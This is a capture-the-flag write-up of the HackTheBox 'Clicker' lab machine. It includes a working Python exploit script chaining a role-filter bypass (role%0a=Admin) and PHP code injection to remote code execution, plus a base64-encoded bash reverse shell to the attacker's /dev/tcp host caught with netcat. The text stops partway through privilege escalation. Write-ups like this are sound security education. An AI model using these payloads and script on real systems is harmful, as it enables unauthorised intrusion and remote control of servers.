---
layout: post
title: Cracking Clicker - NFS Enumeration, Broken Access Control, RCE via File Write, and Privilege Escalation via Environment Variables
date: 28/10/2023
author: Nehal Zaman
tags: ["nfs enumeration", "broken access control", "file write to rce", "env variables hacking"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/clicker/banner.png)

# INTRODUCTION

Welcome to the [Clicker](https://app.hackthebox.com/machines/Clicker) box, crafted by [Nooneye](https://app.hackthebox.com/users/166251) for [HackTheBox](https://app.hackthebox.com/). Our adventure unfolds with a meticulous examination of an NFS share, unveiling its secrets.

Next on our path, we uncover a significant vulnerability that not only grants us access but also opens doors to a vertical escalation, highlighting `Broken Access Control`.

As our journey progresses, we uncover a powerful `file write` feature, which we ingeniously exploit to achieve `Remote Code Execution` (**RCE**), granting us a broader scope of exploration.

Our final destination lies in the intricacies of `environment variables`, where we meticulously manipulate them to ascend to `root` privileges on the system.

With this intriguing setup, our journey commences.

# SCANNING

```shell
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.11.232 -r 1-65535 -u 5000                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.232:22
Open 10.10.11.232:80
Open 10.10.11.232:2049
Open 10.10.11.232:111
Open 10.10.11.232:42173
Open 10.10.11.232:42077
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 01:04 EDT
Initiating Ping Scan at 01:04
Scanning 10.10.11.232 [2 ports]
Completed Ping Scan at 01:04, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:04
Completed Parallel DNS resolution of 1 host. at 01:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:04
Scanning 10.10.11.232 [6 ports]
Discovered open port 111/tcp on 10.10.11.232
Discovered open port 80/tcp on 10.10.11.232
Discovered open port 22/tcp on 10.10.11.232
Discovered open port 42077/tcp on 10.10.11.232
Discovered open port 2049/tcp on 10.10.11.232
Discovered open port 42173/tcp on 10.10.11.232
Completed Connect Scan at 01:04, 0.16s elapsed (6 total ports)
Nmap scan report for 10.10.11.232
Host is up, received syn-ack (0.16s latency).
Scanned at 2023-10-28 01:04:11 EDT for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
111/tcp   open  rpcbind syn-ack
2049/tcp  open  nfs     syn-ack
42077/tcp open  unknown syn-ack
42173/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

We initiated a scan using `rustscan` on the target, exploring a wide range of ports from 1 to 65535. The results revealed several open ports: `22`, `80`, `111`, `2049`, `42077`, and `42173`.

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p22,80,111,2049,42077,42173 10.10.11.232
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 01:07 EDT
Nmap scan report for 10.10.11.232
Host is up (0.16s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89d7393458a0eaa1dbc13d14ec5d5a92 (ECDSA)
|_  256 b4da8daf659cbbf071d51350edd81130 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      3-4 (RPC #100003)
42077/tcp open  nlockmgr 1-4 (RPC #100021)
42173/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.12 seconds
```

Subsequently, we ran an `nmap` scan with detailed service detection and version enumeration on these open ports. The scan confirmed the services associated with each port:

- Port **22/tcp**: SSH running OpenSSH 8.9p1 on an Ubuntu system.
- Port **80/tcp**: An HTTP service powered by Apache httpd 2.4.52 on Ubuntu.
- Port **111/tcp**: rpcbind service version 2-4.
- Port **2049/tcp**: NFS (Network File System) version 3-4.
- Port **42077/tcp**: nlockmgr (Network Lock Manager) version 1-4.
- Port **42173/tcp**: RPC (Remote Procedure Call) status service version 1.

Furthermore, during the `nmap` scan, it identified a domain name, `clicker.htb`, which we included in our system's `/etc/hosts` file for future reference and easier access.

# ENUMERATING WEB

![](/assets/images/writeups/clicker/1.png)

Upon navigating to the website using a web browser, we encountered the page displayed above.

On this website, we noticed the presence of two key functionalities: `login` and `registration`.

![](/assets/images/writeups/clicker/2.png)

After signing up and logging in, we uncovered two additional tabs: `profile` and `play`.

![](/assets/images/writeups/clicker/3.png)

In the `play` section, we found a game where the objective is to click the cursor circle, and as you do so, a counter increases. When this counter reaches a specific point, you have the opportunity to level up in the game and subsequently save your progress.

# ENUMERATING NFS:

```shell
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.11.232
Export list for 10.10.11.232:
/mnt/backups *
                           
```

By using the `showmount` command, we were able to discover a shared directory on the target system with the path `/mnt/backups`.

```shell
┌──(kali㉿kali)-[~]
└─$ mkdir nfs                 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.10.11.232:/mnt/backups ./nfs -o nolock
[sudo] password for kali: 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cd nfs                                   
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/nfs]
└─$ ls -la                
total 2240
drwxr-xr-x  2 nobody nogroup    4096 Sep  5 15:19 .
drwx------ 34 kali   kali       4096 Oct 28 01:45 ..
-rw-r--r--  1 root   root    2284115 Sep  1 16:27 clicker.htb_backup.zip
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/nfs]
└─$ cp clicker.htb_backup.zip ..
```

To access this share from our machine, we created a directory called `nfs` and mounted the NFS share using the command `sudo mount -t nfs 10.10.11.232:/mnt/backups ./nfs -o nolock`. This allowed us to access the contents of the shared directory.

Inside the NFS share, we found a zip file named `clicker.htb_backup.zip`. This zip file turned out to be a backup of the website running on the target system.

```shell
┌──(kali㉿kali)-[~]
└─$ unzip clicker.htb_backup.zip 
Archive:  clicker.htb_backup.zip
   creating: clicker.htb/
  inflating: clicker.htb/play.php    
  inflating: clicker.htb/profile.php  
  inflating: clicker.htb/authenticate.php  
  inflating: clicker.htb/create_player.php  
  inflating: clicker.htb/logout.php  
   creating: clicker.htb/assets/
  inflating: clicker.htb/assets/background.png  
  inflating: clicker.htb/assets/cover.css  
  inflating: clicker.htb/assets/cursor.png  
   creating: clicker.htb/assets/js/
  inflating: clicker.htb/assets/js/bootstrap.js.map  
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js.map  
  inflating: clicker.htb/assets/js/bootstrap.min.js.map  
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js  
  inflating: clicker.htb/assets/js/bootstrap.min.js  
  inflating: clicker.htb/assets/js/bootstrap.bundle.js  
  inflating: clicker.htb/assets/js/bootstrap.bundle.js.map  
  inflating: clicker.htb/assets/js/bootstrap.js  
   creating: clicker.htb/assets/css/
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css  
  inflating: clicker.htb/assets/css/bootstrap-reboot.css  
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css.map  
  inflating: clicker.htb/assets/css/bootstrap.min.css.map  
  inflating: clicker.htb/assets/css/bootstrap.css.map  
  inflating: clicker.htb/assets/css/bootstrap-grid.css  
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css.map  
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css  
  inflating: clicker.htb/assets/css/bootstrap.min.css  
  inflating: clicker.htb/assets/css/bootstrap-grid.css.map  
  inflating: clicker.htb/assets/css/bootstrap.css  
  inflating: clicker.htb/assets/css/bootstrap-reboot.css.map  
  inflating: clicker.htb/login.php   
  inflating: clicker.htb/admin.php   
  inflating: clicker.htb/info.php    
  inflating: clicker.htb/diagnostic.php  
  inflating: clicker.htb/save_game.php  
  inflating: clicker.htb/register.php  
  inflating: clicker.htb/index.php   
  inflating: clicker.htb/db_utils.php  
   creating: clicker.htb/exports/
  inflating: clicker.htb/export.php
 ```

 We proceeded to unzip the backup, revealing various files and directories related to the website, including PHP files, assets, JavaScript files, and CSS files, providing us with valuable information and resources for further exploration and potential exploitation.

# CODE ANALYSIS

We began our examination by looking into the `registration` feature of the website. The provided `PHP` code revealed how the website handled user registration and subsequent functionality.

```php
.
.
SNIP
.
.
<?php
        if ($_SESSION["ROLE"] == "") {
        	echo '<a class="nav-link fw-bold py-1 px-0 active" href="/info.php">Info</a>';
        	echo '<a class="nav-link fw-bold py-1 px-0 active" href="/login.php">Login</a>';
        	echo '<a class="nav-link fw-bold py-1 px-0 active" href="/register.php">Register</a>';
  	    }
  	    else {
        	echo '<a class="nav-link fw-bold py-1 px-0 active" href="/profile.php">Profile</a>';
        	echo '<a class="nav-link fw-bold py-1 px-0 active" href="/logout.php">Logout</a>';
        	echo '<a class="nav-link fw-bold py-1 px-0 active" href="/play.php">Play</a>';
          if ($_SESSION["ROLE"] == "Admin") {
            echo '<a class="nav-link fw-bold py-1 px-0 active" href="/admin.php">Administration</a>';
          } 	    	
  	    }
  	  ?>
.
.
SNIP
.
.
```

In the code segment from `index.php`, we observed that the website displayed different options depending on whether the user was logged in or not. For registered users, it provided links to their `profile`, a `logout` option, and the game to `play`. If a user had an `Admin` role, they also saw an `Administration` link.

```php
.
.
SNIP
.
.
 <main class="px-3">
    <h1>Register</h1>
    <form name="registration_form" action="create_player.php" method="post" onsubmit="return validate()">
      <div class="form-group">
        <label for="inputUsername">Username</label>
        <input class="form-control" name='username' id="exampleInputUsername1" aria-describedby="usernameHelp" placeholder="Username">
      </div>
      <div class="form-group">
        <label for="inputPassword">Password</label>
        <input type="password" name='password' class="form-control" id="InputPassword" placeholder="Password">
      </div>
      <button type="submit" class="btn btn-primary">Submit</button>
    </form>
  </main>
.
.
SNIP
.
.
```

Next, we delved into the registration process, which was managed by `register.php`. This PHP script displayed a registration form where users could input their desired `username` and `password`. When they submitted the form, the data was sent to `create_player.php` using a `POST` request.

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
	if (! ctype_alnum($_POST["username"])) {
		header('Location: /register.php?err=Special characters are not allowed');
	}
	elseif(check_exists($_POST['username'])) {
		header('Location: /register.php?err=User already exists');
	}
	else {
		create_new_player($_POST['username'], $_POST['password']);
		header('Location: /index.php?msg=Successfully registered');
	}
}

?>
```

In `create_player.php`, the script checked if the submitted username and password were not empty. It also ensured that the username contained only alphanumeric characters and didn't include special characters. If all checks passed, the `create_new_player()` function was called, which inserted the user's information into the database. The role was hardcoded as `User` in the database query.

```php
function create_new_player($player, $password) {
	global $pdo;
	$params = ["player"=>$player, "password"=>hash("sha256", $password)];
	$stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
	$stmt->execute($params);
}
```

The `create_new_player()` function, defined in `db_utils.php`, took the `player` (username) and `password` as input, hashed the password using `SHA-256`, and inserted the user's data into the database. This code segment appeared to be secure, with no apparent vulnerabilities that would have allowed for `SQL injection` or other malicious inputs.

# DISCOVERING BROKEN ACCESS CONTROL VULNERABILITY

We dug deeper into a file named `db_utils.php` that handles database-related operations. Most of the code in this file appeared to be secure, except for a specific section that raised a concern.

```php
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

In this code segment, we found a function called `save_profile()`. This function is responsible for updating certain user parameters when provided with a `username`. It constructs an SQL query to make these updates.

What caught our attention was that, although the user's role value is typically set by the backend and not exposed to user manipulation, the `save_profile()` function could potentially be used to manipulate the `role` parameter arbitrarily. This could lead to privilege escalation, allowing a user to elevate their `role` to `Admin`.

```php
.
.
SNIP
.
.
function saveAndClose() {
        window.location.replace("/save_game.php?clicks="+money+"&level="+update_level);
      }
.
.
SNIP
.
.
```

Next, in the code for `play.php`, we identified how the `save_game.php` script is triggered. It appears that this script is executed when a user decides to save their game progress, particularly the number of `clicks` and their game `level`.

```
GET /save_game.php?clicks=89&level=1&role=admin HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=ubq9k1675uqtkgpokkivkvi3u9
Upgrade-Insecure-Requests: 1

```

```
HTTP/1.1 302 Found
Date: Sat, 28 Oct 2023 06:23:35 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /index.php?err=Malicious activity detected!
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

We attempted to manipulate this process by sending a request to `save_game.php` with the parameters `clicks=89&level=1&role=admin`. This action could potentially allow us to set our role to `Admin`.

Unfortunately, our attempt was met with a challenge. It appeared that there was a security filter in place that prevented us from successfully executing this action.

# BYPASSING FILTERS USING CRLF

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['LocationICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```

In the PHP script `save_game.php`, we noticed a stringent check for a keyword called `role` in the `GET` parameters. This check is implemented to prevent any tampering with the user's `role`. If any malicious activity is detected, it redirects the user to the home page and stops further execution of the script.

However, this filter operates as a blacklist, meaning it disallows specific keywords or values. We found a way to bypass this filter by taking advantage of a special character called `CRLF`, which stands for **Carriage Return Line Feed**. In this case, we used the character `%0a` to represent `CRLF`.

By appending `%0a` at the end of the parameter name `role`, we could trick the filter into evaluating the keyword as `role%0a`, which doesn't match the blocked term `role`. This allowed us to bypass the filter while preserving the intended behavior of our `SQL` query.

```
GET /save_game.php?clicks=1337&level=0&role%0a=Admin HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=ibm8uta898vpd03dq84eg8ubtu
Upgrade-Insecure-Requests: 1

```

```
HTTP/1.1 302 Found
Date: Sat, 28 Oct 2023 06:52:43 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /index.php?msg=Game has been saved!
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

![](/assets/images/writeups/clicker/4.png)

The result was that we successfully updated the `role` parameter to `Admin`, which, in turn, granted us access to the `Administration` tab in the application.

# DISCOVERING FILE-WRITE TO RCE

![](/assets/images/writeups/clicker/5.png)

We explored a feature in the application where the `admin` user has the privilege to export data from the system's top players. This export function generates data files with different extensions, including `.txt` and `.json`. The exported data contains information such as the player's `nickname`, `clicks`, and `level`.

```php
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>'; 
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
}
```

However, we noticed that when the chosen export format is not `.txt` or `.json`, the script exports the data in `HTML` format. This is significant because the player's `nickname`, which is part of the data, allows us to inject arbitrary `PHP` code.

To exploit this, we followed a series of steps:

- First, we created a user with lower privileges by sending a `POST` request with the username `abcd` and password `abcd`.

```
POST /create_player.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/register.php
Upgrade-Insecure-Requests: 1

username=abcd&password=abcd
```

- We then authenticated this user.

```
POST /authenticate.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/login.php
Cookie: PHPSESSID=4rd8gdqkgrh2c651jngu7u082a
Upgrade-Insecure-Requests: 1

username=abcd&password=abcd
```

- In the `save_game.php` script, we injected our payload into the `nickname` parameter. Our payload contained `PHP` code: `<%3fphp+system('id')%3b+%3f>`. This code would execute the `id` command on the server.

```
GET /save_game.php?clicks=1337&level=0&nickname=<%3fphp+system('id')%3b+%3f> HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=4rd8gdqkgrh2c651jngu7u082a
Upgrade-Insecure-Requests: 1

```

- Finally, we exported the data as an admin by sending a `POST` request to `export.php` with a `threshold` of `0` and the extension set to `php`.

```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=ibm8uta898vpd03dq84eg8ubtu
Upgrade-Insecure-Requests: 1

threshold=0&extension=php
```

As a result, when we accessed the exported data file at `exports/top_players_mmldkglv.php`, we observed the execution of the PHP code. In the server's response, we could see that the **Remote Code Execution** (`RCE`) was triggered, and we obtained information about the server, including the user `www-data` and their groups, which signifies the successful exploitation of this vulnerability.

```
GET /exports/top_players_mmldkglv.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=ibm8uta898vpd03dq84eg8ubtu
Upgrade-Insecure-Requests: 1

```

```html
.
.
SNIP
.
.
<tr>    <th scope="row">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</th>    <td>1337</td>    <td>0</td>  </tr>
.
.
SNIP
.
.
```

# AUTOMATION FOR THE WIN

To simplify the process of exploiting the `RCE` vulnerability, we created an automation script. This script performs a series of steps to take control of the web application and execute arbitrary commands on the server. Here's how the script works:

- It takes two command-line arguments: the `IP` address of the target and the `command` to execute.
- The script starts by generating a random username and password and registers a new user on the web application. It then logs in as this user.
- It escalates the user's privileges to `Admin` by manipulating the `role` parameter, effectively granting admin access.
- The script logs in as an admin user and proceeds to create another random username and password for a `normal user`.
- It registers the normal user, logs in as this user, and injects a `Remote Code Execution` payload into the `nickname` parameter.
- This payload includes the command specified as an argument to the script.
- The script then triggers the `RCE` vulnerability and sends the payload to the server.
- It exports the data as an `admin` user, which leads to the execution of the `RCE` payload.
- Finally, the script parses the output and displays the results, which typically include the output of the executed command.

```python
import sys
import string
import random
import requests
from bs4 import BeautifulSoup

if len(sys.argv) < 3:
    print(f"USAGE: {sys.argv[0]} <ip> <cmd>")
    sys.exit(1)

url = "http://" + sys.argv[1] + "/"
proxy = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

# creating a userword
username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
print(f"Generated username: {username}")

# creating a password
password = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
print(f"Generated password: {password}")

# registering the user
data = {"username": username, "password": password}
response = requests.post(url + "create_player.php", data=data, allow_redirects=False)
if "Successfully registered" in response.headers["Location"]:
    print("Successfully registered user.")
    session_cookie = response.headers["Set-Cookie"].split(";")[0]
    print(f"Cookie: {session_cookie}")

# login to web app
response = requests.post(url + "authenticate.php", data=data, allow_redirects=False)
if response.headers["Location"] == "/index.php":
    print("User logged in.")
    authenticated_cookie = response.headers["Set-Cookie"].split(";")[0]
    print(f"Authenticated cookie: {authenticated_cookie}")

# privilege escalate to admin
headers = {"Cookie": authenticated_cookie}
response = requests.get(url + "save_game.php?clicks=1337&level=1337&role%0a=Admin", headers=headers, allow_redirects=False)

# login as admin
response = requests.post(url + "authenticate.php", data=data, allow_redirects=False)
if response.headers["Location"] == "/index.php":
    print("Admin logged in.")
    admin_cookie = response.headers["Set-Cookie"].split(";")[0]
    print(f"Admin cookie: {admin_cookie}")

# creating a normal userword
normal_username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
print(f"Generated username: {normal_username}")

# creating a normal password
normal_password = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
print(f"Generated password: {normal_password}")

# registering the normal user
normal_data = {"username": normal_username, "password": normal_password}
response = requests.post(url + "create_player.php", data=normal_data, allow_redirects=False)
if "Successfully registered" in response.headers["Location"]:
    print("Successfully registered normal user.")
    normal_session_cookie = response.headers["Set-Cookie"].split(";")[0]
    print(f"Cookie: {session_cookie}")

# login to web app as normal user
response = requests.post(url + "authenticate.php", data=normal_data, allow_redirects=False)
normal_authenticated_cookie = ""
if response.headers["Location"] == "/index.php":
    print("Normal user logged in.")
    normal_authenticated_cookie = response.headers["Set-Cookie"].split(";")[0]
    print(f"Normal authenticated cookie: {normal_authenticated_cookie}")

# inject rce payload
headers = {"Cookie": normal_authenticated_cookie}
placeholder = ''.join(random.choice(string.ascii_lowercase) for _ in range(8)) 
response = requests.get(url + "save_game.php?clicks=1337&level=1337&nickname="+ placeholder +"<?php%20system('"+ sys.argv[2] +"')%3b%20?>", headers=headers, allow_redirects=False, proxies=proxy)

# triggering rce
response = requests.post(url + "export.php", data={"threshold":"0", "extension": "php"}, headers={"Cookie": admin_cookie}, allow_redirects=False, proxies=proxy)
export_url = url + response.headers["Location"].split(" ")[-1]
response = requests.get(export_url, headers={"Cookie": admin_cookie})
print(f"Export url: {export_url}")

# parsing output
soup = BeautifulSoup(response.content, "html5lib")
results = soup.find_all("th")
for result in results:
    if placeholder in result.get_text():
        print("\n" + result.get_text().replace(placeholder, ""))
```

```shell
┌──(kali㉿kali)-[~/clicker.htb]
└─$ python3 rce_exploit.py clicker.htb 'id'
Generated username: tgxvyjep
Generated password: ateymvih
Successfully registered user.
Cookie: PHPSESSID=k90n49ra5nje3rutnlo2m1bksn
User logged in.
Authenticated cookie: PHPSESSID=8v8tcr3ft863fn7labbpndfusv
Admin logged in.
Admin cookie: PHPSESSID=sqn7btg1018pnmhdlcel04a7nh
Generated username: qpbmwdox
Generated password: brlnugwu
Successfully registered normal user.
Cookie: PHPSESSID=k90n49ra5nje3rutnlo2m1bksn
Normal user logged in.
Normal authenticated cookie: PHPSESSID=uqaja4n91ddq6gpqt09f6fceht
Export url: http://clicker.htb/exports/top_players_0vd7fv4y.php

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In the example shown, the script successfully exploited the `RCE` vulnerability, executed the `id` command, and displayed the output, indicating that it was able to run arbitrary commands on the server. This automation simplifies the process of exploiting the RCE and is a powerful tool for penetration testers and security researchers.

# SHELL AS WWW-DATA

Here's what we did to gain a shell as the `www-data` user:

- We started by encoding a reverse shell command into `base64`.

```shell
┌──(kali㉿kali)-[~]
└─$ echo 'bash -c "bash -i >& /dev/tcp/10.10.X.X/443 0>&1"' | base64
YmFzaCAtYyA..................S80NDMgMD4mMSIK
```

- Next, we used our automation script to exploit the **Remote Code Execution** (`RCE`) vulnerability on the target server.

```shell
┌──(kali㉿kali)-[~/clicker.htb]
└─$ python3 rce_exploit.py clicker.htb 'echo%20YmFzaCAtYyA............................D4mMSIK%20%7C%20base64%20-d%7Cbash'
Generated username: fgldenbc
Generated password: vivudhiy
Successfully registered user.
Cookie: PHPSESSID=60qar5ta42jn0nj0mi47guouo3
User logged in.
Authenticated cookie: PHPSESSID=k1ap4c0drc272c87eikahaab8h
Admin logged in.
Admin cookie: PHPSESSID=6m43rmqe9ee5a86e80k6mvapes
Generated username: dcpixvor
Generated password: wykvpcmi
Successfully registered normal user.
Cookie: PHPSESSID=60qar5ta42jn0nj0mi47guouo3
Normal user logged in.
Normal authenticated cookie: PHPSESSID=kq3ctpru5h7r2u7ri7krq68jn9


```

- As a result, we established a connection back to our machine using the `netcat`.

```shell                                                             
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.11.232] 33126
bash: cannot set terminal process group (1198): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id; hostname
id; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
clicker
bash-5.1$ 
```

We received a shell prompt with the user `www-data`, which is a low-privileged user on the server.

# PRIVILEGE ESCALATION TO JACK

We found a way to escalate our privileges and gain higher-level access to the system, as the user `Jack`. Here's how we achieved this.

First, we examined the system to discover binaries with the `SUID` (Set User ID) bit set. These binaries allow a user to run them with the permissions of the binary's owner. This can potentially lead to privilege escalation.

```shell
bash-5.1$ find / -type f -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/bash
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```

Among the list of `SUID` binaries, we noticed an unusual one located at `/opt/manage/execute_query`. It had both `SUID` and `SGID` (Set Group ID) permissions. This binary allowed us to execute it with the privileges of its owner, `Jack`.

```shell
bash-5.1$ ls -la /opt/manage/execute_query
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 /opt/manage/execute_query
```

To investigate further, we checked the type of the binary using the `file` command. The output indicated that it was a 64-bit ELF executable and that it was set as SUID and SGID.

```shell
bash-5.1$ file /opt/manage/execute_query
/opt/manage/execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
```

